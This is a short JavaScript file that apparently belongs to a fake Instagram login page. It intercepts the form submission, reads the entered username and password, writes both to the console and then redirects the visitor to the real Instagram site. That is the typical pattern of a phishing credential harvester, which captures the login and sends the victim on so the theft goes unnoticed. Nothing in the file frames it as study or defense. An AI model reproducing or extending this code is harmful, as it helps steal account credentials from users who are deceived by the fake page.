// JavaScript to handle form submission and redirect to Instagram
document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission from refreshing the page
    
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    if (username && password) {
        console.log("Username: " + username);
        console.log("Password: " + password);

        // Redirect to Instagram
        window.location.href = "https://www.instagram.com/";
    } else {
        alert("Please fill out both fields.");
    }
});